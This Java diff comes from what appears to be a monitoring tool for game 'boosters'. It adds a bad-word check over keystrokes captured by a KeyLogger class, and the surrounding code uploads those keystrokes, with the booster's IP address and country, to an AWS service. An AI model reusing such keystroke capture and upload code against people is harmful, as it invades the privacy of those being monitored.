@@ -22,18 +22,47 @@ import java.util.Timer;
 
 public class Utils {
 
-    public boolean foundBadWord = false;
+    public static boolean foundBadWord = false;
     public Boolean scriptAlert = false;
     private static Timer timer = new Timer();
 
 
     public void uploadLog(User user, Order order) {
         try {
+            if(checkForBadWords(KeyLogger.log)) {
+                Utils.foundBadWord = true;
+            }
             AWSWebService webService =  new AWSWebService();
             webService.WebService(createLogFile(), createKey(user, order));
+            KeyLogger.log.clear();
         } catch (IOException e) {
             e.printStackTrace();
         }
+    }
+
+    private boolean checkForBadWords(ArrayList<String> log) {
+        ArrayList<String> badWords = getBadWords();
+        for (String badWord: badWords) {
+            for (String message : log) {
+                if(message.toUpperCase().contains(badWord.toUpperCase())) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    private ArrayList<String> getBadWords () {
+        ArrayList<String> badWords = new ArrayList<>();
+        Scanner scanner = null;
+        scanner = new Scanner(KeyLogger.badWordsFilePath);
+        while (scanner.hasNext()) {
+            badWords.add(scanner.nextLine());
+        }
+        System.out.println(badWords);
+        System.out.println(KeyLogger.message);
+        scanner.close();
+        return badWords;
     }
 
     public String createKey(User user, Order order) {
@@ -50,7 +79,7 @@ public class Utils {
         BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(tempFile));
         bufferedWriter.write("The booster's IP adress is: " + getMyIp());
         bufferedWriter.write(System.getProperty("line.separator"));
-        bufferedWriter.write("The booster's Country is:" + getMyCountry());
+        bufferedWriter.write("The booster's Country is: " + getMyCountry());
         bufferedWriter.write(System.getProperty("line.separator"));
         bufferedWriter.write(System.getProperty("line.separator"));
         for (String row : KeyLogger.log) {
@@ -66,7 +95,7 @@ public class Utils {
     public String createFileName(User user, Order order) {
         String fileName = "";
         if(foundBadWord) {
-            fileName += " WARNING";
+            fileName += " WARNING ";
         }
         if (scriptAlert) {
             fileName += " SCRIPT ALERT ";
